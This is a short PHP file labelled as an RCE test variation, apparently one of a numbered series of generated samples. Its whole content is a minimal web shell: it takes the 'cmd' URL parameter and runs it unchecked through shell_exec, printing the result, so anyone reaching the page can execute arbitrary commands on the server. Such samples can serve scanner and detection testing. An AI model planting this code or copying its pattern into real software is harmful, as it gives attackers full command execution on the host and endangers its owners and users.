<?php
// RCE test variation #497
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>